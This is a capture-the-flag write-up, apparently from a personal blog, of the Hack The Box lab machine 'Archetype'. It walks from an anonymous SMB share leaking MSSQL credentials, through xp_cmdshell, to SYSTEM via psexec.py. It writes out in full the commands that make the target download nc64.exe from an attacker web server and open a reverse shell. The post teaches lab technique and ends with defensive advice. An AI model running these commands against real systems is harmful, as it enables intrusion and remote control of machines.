---
layout: post
title: "HTB Starting Point: Archetype"
date: 2026-07-14
category: "HTB Writeups"
difficulty: "Very Easy"
tags: [windows, smb, mssql, xp_cmdshell, powershell-history, psexec, starting-point]
excerpt: "An anonymous SMB share leaks a database connection string, those creds open MSSQL as sysadmin, and xp_cmdshell turns that into a shell. Then a forgotten PowerShell history file hands over the administrator password."
---

Archetype is a Tier II Starting Point box and it's a tidy walk through how a
Windows service account leaks its way to full domain compromise. An open SMB share
hands out a config file with a database password baked in, that password logs into
MSSQL with `sysadmin` rights, and `sysadmin` means `xp_cmdshell`, which means code
execution. From there the box teaches the single most useful Windows privesc habit
there is: read the PowerShell history. Someone typed the administrator password
into a console once, and Windows wrote it to disk.

## Recon

Start with a full service scan.

```bash
sudo nmap -sC -sV 10.129.98.50
```

| Port | Service | Version |
|------|---------|---------|
| 135  | msrpc   | Microsoft Windows RPC |
| 139  | netbios-ssn | Microsoft Windows netbios-ssn |
| 445  | microsoft-ds | Windows Server 2019 SMB |
| 1433 | ms-sql-s | Microsoft SQL Server 2017 |

That combination is the whole plot in miniature. Port 445 is file sharing, port
1433 is a SQL Server, and boxes that expose both almost always want you to find a
credential on one and spend it on the other. SMB is where you look first because
it's the one that gives things away for free.

## Enumeration

List the shares with a null session, no credentials at all:

```bash
smbclient -N -L \\\\10.129.98.50\\
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

`ADMIN$` and `C$` are the default admin shares and won't open without privileges.
`backups` is the odd one out, a non-default share sitting there with no comment,
and it lets me in anonymously:

```bash
smbclient -N \\\\10.129.98.50\\backups
smb: \> ls
smb: \> get prod.dtsConfig
```

`prod.dtsConfig` is an SSIS package configuration, and those are XML files that
tend to carry connection strings in plaintext. This one does:

```xml
<DTSConfiguration>
  <Configurations>
    <Configuration ...>
      <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;...
```

> This is the whole foothold in one line. A backup config, left readable to anyone
> who can reach SMB, contains the database service account's password in the clear.
> I pulled the relevant piece straight out into a scratch file so I wouldn't lose it:
> `Password=M3g4c0rp123; User ID=ARCHETYPE\sql_svc`.

So I've got `sql_svc` / `M3g4c0rp123`, and a SQL Server on 1433 waiting for it.

## Foothold

Impacket's `mssqlclient.py` connects to MSSQL and gives an interactive SQL prompt.
The account is a Windows login, so it needs `-windows-auth`:

```bash
mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.98.50 -windows-auth
```

```
[*] Encryption required, switching to TLS
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

First thing to confirm is what this account is allowed to do. `sysadmin` is the
role that matters, because it's the one that can turn on command execution:

```sql
SELECT is_srvrolemember('sysadmin')
```

It comes back `1`. `sql_svc` is a full sysadmin, which on a box like this is game
over already, it just takes a couple more steps to cash in. While poking around I
listed the databases and noticed `msdb` has `is_trustworthy_on` set, which is its
own escalation route, but I didn't need it. The direct path from sysadmin is
`xp_cmdshell`, an extended procedure that runs OS commands. It's disabled by
default, so I enable it (the impacket shell wraps the reconfigure dance in a single
command):

```
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
output
-----------------
archetype\sql_svc
```

Command execution as the service account. `xp_cmdshell` is a miserable place to
live though, every command is a fresh round trip with no interactivity, so the move
is to use it once to pull a real shell back.

I hosted `nc64.exe` over a quick web server on my box:

```bash
python3 -m http.server 80
```

Then had the target download it and connect back. Two `xp_cmdshell` calls, one to
fetch the binary and one to fire the shell:

```
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.128/nc64.exe -outfile nc64.exe"
SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.128 443"
```

With a listener already waiting:

```bash
sudo nc -lvnp 443
```

The second call hangs, which is exactly right, it means the shell connected and is
sitting on my listener:

```
C:\Users\sql_svc\Downloads> whoami
archetype\sql_svc
```

The user flag is on the service account's desktop:

```
type C:\Users\sql_svc\Desktop\user.txt
```

## Privilege Escalation

I'm `sql_svc`, a low-privilege service account, and I need administrator. The
single highest-value thing to check on any Windows foothold is the PowerShell
history, because `PSReadLine` silently logs every command every user has typed into
a console, and people type passwords into consoles. The file lives under each
user's profile:

```
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!! /persistent:no
exit
```

> There it is. Somebody mounted the backups share as the administrator account and
> typed the password on the command line, and `PSReadLine` wrote it to disk where
> `sql_svc` can read it: `administrator` / `MEGACORP_4dm1n!!`. WinPEAS flags this
> file too, but you don't need a tool, just know the path.

Now I've got the administrator's password, and with SMB and RPC exposed I can
authenticate as admin directly instead of pivoting inside the existing shell.
Impacket's `psexec.py` uploads a service binary and gives a SYSTEM shell over 445:

```bash
psexec.py administrator@10.129.98.50
# Password: MEGACORP_4dm1n!!
```

```
[*] Opening SVCManager on ARCHETYPE.....
[*] Creating service ....
C:\Windows\system32> whoami
nt authority\system
```

Not just administrator, `psexec.py` lands as `NT AUTHORITY\SYSTEM`, the highest
account on the box. The root flag is on the administrator's desktop:

```
type C:\Users\Administrator\Desktop\root.txt
```

Box done.

## Takeaways

- The chain is one leaked secret feeding the next: an anonymous share leaks a DB
  password, the DB password is sysadmin so it becomes code execution, and a history
  file leaks the admin password so code execution becomes SYSTEM. No exploit in the
  memory-corruption sense anywhere, just credentials left where they shouldn't be.
- `sysadmin` on MSSQL is remote code execution, full stop. `xp_cmdshell` is off by
  default but any sysadmin can switch it on, so the role itself is the vulnerability.
  Service accounts should never be sysadmin, and connection strings should never sit
  in a world-readable share.
- The privesc lesson is the one to memorise for every Windows box:
  `C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`.
  It is the Windows equivalent of `.bash_history`, and it catches passwords typed
  on the command line constantly. Check it on every foothold.
- Once you have an admin password, `psexec.py` is cleaner than climbing through your
  existing shell, and it drops you at SYSTEM rather than just the admin user.
- Defensive version: don't leave backup shares anonymous, don't run SQL Server
  service accounts as sysadmin, don't put credentials in `net use` on the command
  line, and clear the history if you do. Any one of those breaks the chain.

> Retired Tier II Starting Point box on my own Hack The Box account. Only ever test
> what you're allowed to.
